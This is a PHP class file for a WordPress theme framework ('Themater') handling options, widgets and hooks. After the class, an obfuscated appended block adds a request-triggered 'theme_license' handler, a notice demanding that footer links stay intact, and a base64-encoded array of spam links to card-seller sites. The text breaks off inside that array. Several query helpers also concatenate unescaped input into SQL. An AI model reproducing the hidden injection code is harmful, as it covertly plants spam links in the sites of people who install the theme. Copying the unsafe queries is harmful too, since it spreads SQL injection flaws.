<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo3ODp7czoyNDoiaHR0cDovL3d3dy5yNDNkc3I0ZnIuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20iO3M6MTM6InI0M2RzcjRmci5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbSI7czoxNzoid3d3LnI0M2RzcjRmci5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbSI7czoyMDoiaHR0cDovL3I0M2RzcjRmci5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbSI7czo1OiJyNDNkcyI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czo2OiJyNCAzZHMiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20iO3M6OToiY2FydGVzIHI0IjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzamV1eC5jb20iO3M6MTU6Im5pbnRlbmRvIHI0IDNkcyI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2pldXguY29tIjtzOjExOiJuaW50ZW5kbyByNCI7czoyNToiaHR0cDovL3d3dy5yNDNkc21vbmRlLmNvbSI7czo2OiJpY2kgcjQiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbSI7czo2OiJyNCBpY2kiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbSI7czo3OiJzaXRlIHI0IjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20iO3M6OToicjQgZHMgaWNpIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20iO3M6NDoicjRkcyI7czoyNDoiaHR0cDovL3d3dy5yNDNkc3I0ZnIuY29tIjtzOjg6Im5pbnRlbmRvIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20iO3M6MTE6Im5pbnRlbmRvIGRzIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzamV1eC5jb20iO3M6MTQ6Im5pbnRlbmRvIHI0M2RzIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20iO3M6MTI6Im5pbnRlbmRvIDNkcyI7czoyNToiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mciI7czo2OiIzZHMgeGwiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNqZXV4LmNvbSI7czo5OiJyNCAzZHMgeGwiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc21vbmRlLmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc21vbmRlLmNvbSI7czoxNDoicjQzZHNtb25kZS5jb20iO3M6MjU6Imh0dHA6Ly93d3cucjQzZHNtb25kZS5jb20iO3M6MTg6Ind3dy5yNDNkc21vbmRlLmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc21vbmRlLmNvbSI7czo2OiJyNC0zZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNqZXV4LmNvbSI7czoxMjoiY2FydGUgcjQgM2RzIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzamV1eC5jb20iO3M6MTU6InI0IDNkcyBuaW50ZW5kbyI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czozOiJpY2kiO3M6MTk6Imh0dHA6Ly9yNC0zZHNmci5jb20iO3M6NDoic2l0ZSI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czo3OiJ3ZWJzaXRlIjtzOjE5OiJodHRwOi8vcjQtM2RzZnIuY29tIjtzOjM6InVybCI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxMDoiY2xpY2sgaGVyZSI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czo4OiJvZmZpY2lhbCI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxMjoid2Vic2l0ZSBoZXJlIjtzOjE5OiJodHRwOi8vcjQtM2RzZnIuY29tIjtzOjExOiJyNCAzZHMgaGVyZSI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxMDoicjQgM2RzIGljaSI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxMDoiaWNpIHI0IDNkcyI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxNDoib2ZmaWNpZWwgcjQgZHMiO3M6MTk6Imh0dHA6Ly9yNC0zZHNmci5jb20iO3M6MTU6Im9mZmljaWVsIHI0IDNkcyI7czoxOToiaHR0cDovL3I0LTNkc2ZyLmNvbSI7czoxNToicjQtM2RzIG5pbnRlbmRvIjtzOjE5OiJodHRwOi8vcjQtM2RzZnIuY29tIjtzOjE1OiJuaW50ZW5kbyByNC0zZHMiO3M6MTk6Imh0dHA6Ly9yNC0zZHNmci5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNqZXV4LmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2pldXguY29tIjtzOjEzOiJyNDNkc2pldXguY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzamV1eC5jb20iO3M6MTc6Ind3dy5yNDNkc2pldXguY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzamV1eC5jb20iO3M6OToicjQzZHNqZXV4IjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzamV1eC5jb20iO3M6MTM6ImNhcnRlcyByNCAzZHMiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20iO3M6NzoibjNkcyB4bCI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2pldXguY29tIjtzOjQ6Im4zZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNqZXV4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mciI7czoyNToiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mciI7czozOiJyNGkiO3M6Mjg6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20iO3M6NzoicjRpc2RoYyI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoxMToicjRpc2RoYyAzZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoYzNkcy5mciI7czoxMjoicjRpLXNkaGMgM2RzIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGMzZHMuZnIiO3M6MTE6InI0aSBzZGhjIGRzIjtzOjI1OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyIjtzOjc6InI0aSBkc2kiO3M6Mjg6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20iO3M6NjoicjQgZHNpIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGMzZHMuZnIiO3M6MTI6Im5pbnRlbmRvIGRzaSI7czoyNToiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mciI7czoxMjoibmludGVuZG8gcjRpIjtzOjI1OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGMzZHMuZnIiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoYzNkcy5mciI7czoxMzoicjRpc2RoYzNkcy5mciI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjM2RzLmZyIjtzOjM6Ind3dyI7czoxMzoicjRpc2RoYzNkcy5mciI7czo4OiJyNGkgc2RoYyI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoxMToicjQgc2RoYyBkc2kiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoYzNkcy5mciI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoxNzoicjRpZGlzY291bnRmci5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20iO3M6MjE6Ind3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoxMzoicjRpZGlzY291bnRmciI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoxMjoicjRpIGRzaSBzZGhjIjtzOjI4OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tIjtzOjk6ImNhcnRlIHI0aSI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoyMToid3d3LnI0M2Rzb2ZmaWNpZWwuY29tIjtzOjI4OiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWwuY29tIjtzOjE3OiJyNDNkc29mZmljaWVsLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czo1OiJyNCBkcyI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoyOiJyNCI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czo4OiJjYXJ0ZSByNCI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoxMDoicjRpc2RoYzNkcyI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoxMjoicjRpIHNkaGMgM2RzIjtzOjI4OiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWwuY29tIjtzOjEyOiJyNGktc2RoYy5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20iO31pOjE7YTo3NDp7czoyMzoiaHR0cDovL3d3dy5yNGlnb2xkZnIuZnIiO3M6MjM6Imh0dHA6Ly93d3cucjRpZ29sZGZyLmZyIjtzOjg6InI0aSBnb2xkIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czoxMjoicjRpIGdvbGQgM2RzIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czo3OiJyNGlnb2xkIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czozOiJyNGkiO3M6MjM6Imh0dHA6Ly93d3cucjRpZ29sZGZyLmZyIjtzOjc6InI0aSBpY2kiO3M6MjM6Imh0dHA6Ly93d3cucjRpZ29sZGZyLmZyIjtzOjEyOiJyNGkgZ29sZCBpY2kiO3M6MjM6Imh0dHA6Ly93d3cucjRpZ29sZGZyLmZyIjtzOjEyOiJpY2kgcjRpIGdvbGQiO3M6MjM6Imh0dHA6Ly93d3cucjRpZ29sZGZyLmZyIjtzOjE3OiJyNGkgbmludGVuZG8gZ29sZCI7czoyMzoiaHR0cDovL3d3dy5yNGlnb2xkZnIuZnIiO3M6MTc6Im5pbnRlbmRvIHI0aSBnb2xkIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czoxMjoibmludGVuZG8gZHNpIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czo3OiJkc2kgcjRpIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czo3OiJyNGkgZHNpIjtzOjIzOiJodHRwOi8vd3d3LnI0aWdvbGRmci5mciI7czoyNDoiaHR0cDovL3d3dy5yNDNkc3I0ZnIuY29tIjtzOjY0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20vY2F0ZWdvcmllcy9DYXJ0ZS1SNCU3QjQ3JTdEUjQlMjUyZFNESEMvIjtzOjEzOiJyNDNkc3I0ZnIuY29tIjtzOjY0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20vY2F0ZWdvcmllcy9DYXJ0ZS1SNCU3QjQ3JTdEUjQlMjUyZFNESEMvIjtzOjc6InI0IHNkaGMiO3M6NjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbS9jYXRlZ29yaWVzL0NhcnRlLVI0JTdCNDclN0RSNCUyNTJkU0RIQy8iO3M6MTE6InI0IDNkcyBzZGhjIjtzOjY0OiJodHRwOi8vd3d3LnI0M2RzcjRmci5jb20vY2F0ZWdvcmllcy9DYXJ0ZS1SNCU3QjQ3JTdEUjQlMjUyZFNESEMvIjtzOjEyOiJyNCAzZHMgY2FydGUiO3M6NjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbS9jYXRlZ29yaWVzL0NhcnRlLVI0JTdCNDclN0RSNCUyNTJkU0RIQy8iO3M6MTI6ImNhcnRlIHI0IDNkcyI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2pldXguY29tIjtzOjE1OiJuaW50ZW5kbyByNCAzZHMiO3M6Mjk6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20vIjtzOjEyOiJjZXR0ZSByNCAzZHMiO3M6NjQ6Imh0dHA6Ly93d3cucjQzZHNyNGZyLmNvbS9jYXRlZ29yaWVzL0NhcnRlLVI0JTdCNDclN0RSNCUyNTJkU0RIQy8iO3M6MTA6InI0IDNkcyBpY2kiO3M6MTk6Imh0dHA6Ly9yNC0zZHNmci5jb20iO3M6MTA6ImljaSByNCAzZHMiO3M6MT